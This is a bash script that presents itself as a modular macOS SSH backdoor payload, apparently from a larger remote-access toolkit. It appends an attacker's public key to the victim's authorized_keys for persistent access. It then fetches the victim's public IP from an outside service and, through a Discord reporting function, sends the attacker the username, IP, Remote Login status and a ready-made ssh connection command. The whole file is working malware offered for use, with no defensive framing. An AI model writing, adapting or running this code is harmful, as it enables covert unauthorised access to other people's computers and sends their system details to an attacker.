#!/bin/bash
# ============================================================
# SSH Backdoor for macOS - Modular Remote Payload
# ============================================================
# Adds attacker's SSH key for persistent access
# Requires: $KEY (attacker's public SSH key)
# ============================================================

SYSID=$(get_sysid)

# Default key if not provided (CHANGE THIS or pass $KEY)
SSH_KEY="${KEY:-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEXAMPLEKEYHERE attacker@host}"

if [[ "$SSH_KEY" == *"EXAMPLEKEYHERE"* ]]; then
    send_discord "❌ SSH backdoor failed on $SYSID - Default key detected. Set \$KEY variable."
    exit 1
fi

# Create .ssh directory if needed
SSH_DIR="$HOME/.ssh"
mkdir -p "$SSH_DIR"
chmod 700 "$SSH_DIR"

AUTH_KEYS="$SSH_DIR/authorized_keys"

# Check if key already exists
if grep -q "$SSH_KEY" "$AUTH_KEYS" 2>/dev/null; then
    send_discord "⚠️ SSH key already installed on $SYSID"
    exit 0
fi

# Add key
echo "$SSH_KEY" >> "$AUTH_KEYS"
chmod 600 "$AUTH_KEYS"

# Get connection info
IP=$(curl -s https://api.ipify.org 2>/dev/null)
USER=$(whoami)

# Check if SSH is enabled
if systemsetup -getremotelogin 2>/dev/null | grep -qi "on"; then
    SSH_STATUS="✅ Enabled"
else
    SSH_STATUS="❌ Disabled (enable in System Preferences → Sharing → Remote Login)"
fi

send_discord "🔑 **SSH Backdoor Installed on $SYSID**\n• User: \`$USER\`\n• Public IP: \`$IP\`\n• Remote Login: $SSH_STATUS\n• Connect: \`ssh $USER@$IP\`"

